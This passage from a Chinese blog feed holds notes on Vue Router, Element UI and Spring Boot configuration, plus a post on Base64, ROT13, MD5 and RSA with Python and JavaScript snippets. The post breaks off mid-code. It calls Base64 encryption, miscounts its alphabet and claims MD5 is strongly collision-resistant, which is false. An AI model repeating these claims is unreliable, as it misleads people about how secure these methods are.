–&gt;配置到本地路由<br>src/App.vue  –&gt;全局配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Topic <span class="keyword">from</span> <span class="string">&#x27;../views/Topic.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Reader <span class="keyword">from</span> <span class="string">&#x27;../views/Reader.vue&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Router)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Router(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,    <span class="comment">//&lt;router-link to=&quot;/&quot;</span></span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;Topic&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: Topic</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/reader&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: Reader</span><br><span class="line">    &#125;]</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;q0o0p&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/topic&quot;</span>&gt;</span>Topic<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/reader&quot;</span>&gt;</span>Reader<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>跨域的问题及服务器端的操作<br>说在前面的： Vue项目在开发的时候，是处于本地环境，访问服务器数据，由于域名的不一样，所以会出现跨域问题，而AJAX在跨域访问的时候是有限制的，所以会出现跨域问题。但是，生产时候，将Vue项目打包文件和服务器webAPI一起发布的在同一个地方的时候，将不会出现跨域问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 路由接口代理配置</span></span><br><span class="line">proxyTable: &#123;</span><br><span class="line">  <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">    target: <span class="string">&#x27;https://localhost:8082&#x27;</span>,</span><br><span class="line">    changeOrigin: <span class="keyword">true</span>,</span><br><span class="line">    pathRewrite: &#123;</span><br><span class="line">      <span class="string">&#x27;^/api&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="element-ui插件"><a href="#element-ui插件" class="headerlink" title="element-ui插件"></a>element-ui插件</h3><p><a href="https://element.eleme.cn/2.0/#/zh-CN/component/container">https://element.eleme.cn/2.0/#/zh-CN/component/container</a><br>安装element-ui</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install element-ui -S</span><br></pre></td></tr></table></figure><ul><li>查看node_modules中是否有 element-ui的文件夹<br><img src="2.png"></li><li>main.js 中导入element-ui组件<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ElementUI from <span class="string">&#x27;element-ui&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(ElementUI)</span><br></pre></td></tr></table></figure></li></ul><p>Element UI主要标签:<br>●el-container: 构建整个页面框架。<br>●el-aside: 构建左侧菜单。<br>●el-menu: 左侧菜单内容,常用属性.<br>    :default-openeds:默认展开的菜单，通过菜单的index值来关联。<br>    :default-active:默认选中的菜单，通过菜单的index值来关联。<br>●el-submenu: 可展开的菜单，常用属性:<br>index:菜单的下标，文本类型，不能是数值类型。<br>●template: 对应el-submenu的菜单名。<br>●i:设置菜单图标，通过class属性实则。<br>    。el-icon-messae<br>    。el-icon-menu<br>    。el-icon-setting<br>●el-menu-item: 菜单的子节点，不可再展开，常用属性: index:菜单的下标，文本类型，不能是数值类型。</p><h3 id="vue-router-动态构建菜单"><a href="#vue-router-动态构建菜单" class="headerlink" title="vue router 动态构建菜单"></a>vue router 动态构建菜单</h3><p>vue add axios</p><p>QuestAdd.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">required: true  //必填</span><br><span class="line">message: &#x27;提示信息&#x27;</span><br><span class="line">trigger: &#x27;blur&#x27; //触发事件</span><br></pre></td></tr></table></figure><p>ruleFrom 绑定:为了获取对象<br>rules绑定: 做校验<br>:rules=” “ 绑定:和表单绑定<br>:model=” “ 绑定:数据绑定<br>prop=” “ 绑定:和选项进行绑定</p><hr><h2 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h2><h3 id="创建springboot项目"><a href="#创建springboot项目" class="headerlink" title="创建springboot项目"></a>创建springboot项目</h3><p><img src="1.png"></p><h3 id="使用yml连接数据库"><a href="#使用yml连接数据库" class="headerlink" title="使用yml连接数据库"></a>使用yml连接数据库</h3><p>将properties文件删除<br>(可以忽略:根据实际情况,执行一下  maven -X clean install)</p><p><code>正常的情况是先加载yml，接下来加载properties文件。如果相同的配置存在于两个文件中。最后会使用properties中的配置。最后读取的优先集最高。</code><br><code>yml文件的好处，天然的树状结构，同的前缀只需要写一次,实质上跟properties是差不多的。</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  datasource:</span><br><span class="line">    url: jdbc:mysql:<span class="comment">//localhost:3306/q0o0p?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=true&amp;serverTimezone=UTC</span></span><br><span class="line">    # url: jdbc:mysql:<span class="comment">//test?serverTimezone=UTC&amp;characterEncoding=utf8&amp;useUnicode=true&amp;useSSL=false</span></span><br><span class="line">  </span><br><span class="line">    username: root</span><br><span class="line">    password: root</span><br><span class="line">    driver-<span class="class"><span class="keyword">class</span>-<span class="title">name</span>: <span class="title">com</span>.<span class="title">mysql</span>.<span class="title">cj</span>.<span class="title">jdbc</span>.<span class="title">Driver</span></span></span><br><span class="line"><span class="class">  <span class="title">jpa</span>: </span></span><br><span class="line"><span class="class">    <span class="title">show</span>-<span class="title">sql</span>: <span class="title">true</span>  #打印<span class="title">sql</span></span></span><br><span class="line"><span class="class">    <span class="title">properties</span>:</span></span><br><span class="line"><span class="class">      <span class="title">hibernate</span>: </span></span><br><span class="line"><span class="class">        <span class="title">format</span>-<span class="title">sql</span>: <span class="title">true</span>  #格式化<span class="title">sql</span>,自动换行</span></span><br><span class="line"><span class="class"><span class="title">server</span>: </span></span><br><span class="line"><span class="class">  <span class="title">part</span>: 8181</span></span><br></pre></td></tr></table></figure><h3 id="JPA-自定义实现动态表名映射"><a href="#JPA-自定义实现动态表名映射" class="headerlink" title="JPA 自定义实现动态表名映射"></a>JPA 自定义实现动态表名映射</h3><p>注意命名规则,实体类和表名实现动态映射</p><hr><p>创建项目勾选:<br>Babel<br>Router 路由<br>linter/Formatter<br>使用配置文件<br><img src="3.png"></p><p>创建成功以后:<br>插件–&gt;添加插件–&gt;vue-cli-plugin-element<br><img src="4.png"></p><p>依赖–&gt;安装依赖–&gt;运行依赖–&gt;axios(或:npm install axios)<br>开发依赖–&gt;less-loader 和 less(或者命令:npm install less less-loader –save)</p><p>运行:<br>npm run build<br>vue-cli-service serve</p><hr><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span><span class="tag">&lt;/<span class="name">template</span>&gt;</span>  //ui结构</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   //行为</span><br><span class="line">&lt;<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>     //样式</span><br></pre></td></tr></table></figure><p>重定向(访问根路径时自动跳转到登录界面)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: &#x27;/&#x27;,</span><br><span class="line">      redirect: &#x27;/login&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      path: &#x27;/login&#x27;,</span><br><span class="line">      component: Login</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><p>Login.vue<br><code>.</code>代表类选择器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;style lang=&quot;less&quot; scoped&gt;</span><br><span class="line">  .login_container</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>main.js导入css样式<br>import ‘./assets/css/global.css’  /<em>导入全局样式表</em>/</p><p>plugins–&gt;element.js<br>导入element-ui使用的组件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;Form,FormItem&#125; <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span> <span class="comment">//导入组件</span></span><br><span class="line"><span class="keyword">import</span> &#123;Input&#125; <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span> <span class="comment">//导入组件</span></span><br><span class="line">Vue.use(Form)</span><br><span class="line">Vue.use(FormItem)</span><br><span class="line">Vue.use(Input) <span class="comment">//全局可用</span></span><br></pre></td></tr></table></figure><p>输入框–&gt;选择图标样式–&gt;选择前置图标<br>element里面没有需要用的用户登录图标,可用使用阿里图标库<br><a href="https://www.iconfont.cn/collections/index?spm=a313x.7781069.1998910419.da2e3581b&amp;type=1">https://www.iconfont.cn/collections/index?spm=a313x.7781069.1998910419.da2e3581b&amp;type=1</a></p><p>按钮:<br>@click=””  //绑定单击事件</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见的加密算法及Python解码</title>
      <link href="/2020/04/06/encryption-algorithm/"/>
      <url>/2020/04/06/encryption-algorithm/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Base64加密方式-可逆"><a href="#Base64加密方式-可逆" class="headerlink" title="Base64加密方式(可逆)"></a>Base64加密方式(可逆)</h2><h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h3><p>字符包括字母A-Z/a-z/数组0-9/ 加号’+’斜杠’/’ 这样共有62个字符<br>Base64要求把每三个8Bit的字节转换为四个6Bit的字节（3<em>8 = 4</em>6 = 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1/3。</p><p>Base64编码遵循以下规则： <br>①.把3个字符变成4个字符。 <br>②每76个字符加一个换行符。 <br>③.最后的结束符也要处理。 </p><h3 id="原理示例："><a href="#原理示例：" class="headerlink" title="原理示例："></a>原理示例：</h3><p>3<em>8 = 4</em>6<br>内存一个字节占8位<br>转前：                       s        1        3<br>先转ASCII:                  115      49        51<br>再转二进制：               01110011 00110001 00110011<br>3*8共24位——&gt;6位一组分4组：   011100   110011   000100   110011<br>每组高位补两个0：          00011100 00110011 00000100 00110011<br>得到四个整数值：              28       51       4         51<br>对照ASCII转换：               c        z        E         z<br>（计算机以字节为最小单位（1 byte= 8 位），每6位不到8位，高位补0）</p><h3 id="前端加密-解密代码："><a href="#前端加密-解密代码：" class="headerlink" title="前端加密/解密代码："></a>前端加密/解密代码：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;js/base64.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="keyword">var</span> str = b.encode(<span class="string">&quot;admin:admin&quot;</span>);       <span class="comment">//加密</span></span><br><span class="line"><span class="keyword">var</span> str1 = b.decode(str);       <span class="comment">//解密</span></span><br><span class="line"><span class="built_in">console</span>.log(str);</span><br><span class="line"><span class="built_in">console</span>.log(str1);</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_base64</span>():</span> <span class="comment">#base64解密 ，注意解密后是b&#x27;&#x27;里面的字符</span></span><br><span class="line">    b1 = base64.b64decode(a.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;base64解密：&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(b1,<span class="string">&#x27;utf-8&#x27;</span>))    </span><br><span class="line">    b = base64.b64encode(a.encode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># 被编码的参数必须是二进制数据</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;base64加密：&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(b,<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><hr><h2 id="Rot13加密"><a href="#Rot13加密" class="headerlink" title="Rot13加密"></a>Rot13加密</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h3><p>一种简易的替换式密码。两个连续的ROT13应用函式会回复原始文字（对等加密）<br>对任何字元x：ROT13(ROT13(x))=ROT26(x)=x。</p><p>A换成N、B换成O、依此类推到M换成Z，然后串行反转：N换成A、O换成B、最后Z换成M（如图所示）。只有这些出现在英文字母里的字符受影响；数字、符号、空白字符以及所有其他字符都不变。替换后的字母大小写保持不变。</p><p>方法一：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">input</span>(<span class="string">&#x27;请输入：&#x27;</span>)   <span class="comment">#rot13解密（rot13二次加密以后得到源码）</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_rot13</span>():</span></span><br><span class="line">    lookup_tuple = &#123;<span class="string">&#x27;A&#x27;</span>:<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;B&#x27;</span>:<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;C&#x27;</span>:<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;D&#x27;</span>:<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;E&#x27;</span>:<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;F&#x27;</span>:<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;G&#x27;</span>:<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;H&#x27;</span>:<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;I&#x27;</span>:<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;J&#x27;</span>:<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;K&#x27;</span>:<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;L&#x27;</span>:<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;N&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;O&#x27;</span>:<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;P&#x27;</span>:<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;R&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;S&#x27;</span>:<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;T&#x27;</span>:<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;U&#x27;</span>:<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;V&#x27;</span>:<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;W&#x27;</span>:<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;X&#x27;</span>:<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>:<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>:<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>:<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;e&#x27;</span>:<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;g&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;h&#x27;</span>:<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;i&#x27;</span>:<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;j&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;k&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;l&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;n&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;o&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;p&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;q&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;t&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;v&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;w&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;z&#x27;</span>:<span class="string">&#x27;m&#x27;</span>&#125;</span><br><span class="line">    c = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> lookup_tuple:</span><br><span class="line">            b = i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b = lookup_tuple[i]</span><br><span class="line">        c = c + b</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_rot13</span>():</span></span><br><span class="line">    src=<span class="built_in">input</span>(<span class="string">&quot;输入加密字符串:&quot;</span>)</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> src:</span><br><span class="line">        <span class="keyword">if</span>(x.isalpha()):</span><br><span class="line">            <span class="keyword">if</span>(x.isupper()):</span><br><span class="line">                x = <span class="built_in">ord</span>(x)+<span class="number">13</span></span><br><span class="line">                <span class="keyword">if</span>(x&gt;<span class="number">90</span>):</span><br><span class="line">                    x=x-<span class="number">26</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = <span class="built_in">ord</span>(x)+<span class="number">13</span></span><br><span class="line">                <span class="keyword">if</span>(x&gt;<span class="number">122</span>):</span><br><span class="line">                    x=x-<span class="number">26</span></span><br><span class="line">            result = result + <span class="built_in">chr</span>(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = result + x</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">encrypt_rot13()</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">result=[]</span><br><span class="line">upperCase=string.ascii_uppercase</span><br><span class="line">lowerCase=string.ascii_lowercase</span><br><span class="line">upperDict=&#123;&#125;</span><br><span class="line">lowerDict=&#123;&#125;</span><br><span class="line">inputStr=<span class="built_in">input</span>(<span class="string">&quot;请输入你要加密或解密的字符串&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请确认%s是否为你想要输入的字符串,如果正确请输入y,否则输入n&quot;</span>%(inputStr))</span><br><span class="line">    flag=<span class="built_in">input</span>(<span class="string">&quot;请输入你的确认结果&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (flag==<span class="string">&#x27;n&#x27;</span>) <span class="keyword">or</span> (flag==<span class="string">&#x27;N&#x27;</span>):</span><br><span class="line">        inputStr=<span class="built_in">input</span>(<span class="string">&quot;请重新输入你要加密或解密的字符串&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;确认方式不合理&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(upperCase)):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">13</span>:</span><br><span class="line">        upperDict[upperCase[i]]=upperCase[i+<span class="number">13</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        upperDict[upperCase[i]]=upperCase[i-<span class="number">13</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(lowerCase)):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">13</span>:</span><br><span class="line">        lowerDict[lowerCase[i]]=lowerCase[i+<span class="number">13</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lowerDict[lowerCase[i]]=lowerCase[i-<span class="number">13</span>]</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> inputStr:</span><br><span class="line">    <span class="keyword">if</span> ch <span class="keyword">in</span> lowerDict:</span><br><span class="line">        result.append(lowerDict[ch])</span><br><span class="line">    <span class="keyword">elif</span> ch <span class="keyword">in</span> upperDict:</span><br><span class="line">        result.append(upperDict[ch])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result.append(ch)</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;最终加密结果为%s&quot;</span>%(result))</span><br></pre></td></tr></table></figure><hr><h3 id="md5加密"><a href="#md5加密" class="headerlink" title="md5加密"></a>md5加密</h3><h3 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h3><p>1、压缩性：任意长度的数据，算出的MD5值长度都是固定的。<br>2、容易计算：从原数据计算出MD5值很容易。<br>3、抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。<br>4、强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。</p><p>共有6中加密方法:hex_md5(s), b64_md5(s), str_md5(s), hex_hmac_md5(key, data), b64_hmac_md5(key, data), str_hmac_md5(key, data)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;js/md5.js&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="keyword">var</span> pwd = hex_md5(<span class="string">&quot;Victor&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(pwd);</span><br></pre></td></tr></table></figure><p>MD5解密网站：<a href="http://www.cmd5.com/">http://www.cmd5.com</a></p><hr><h2 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span 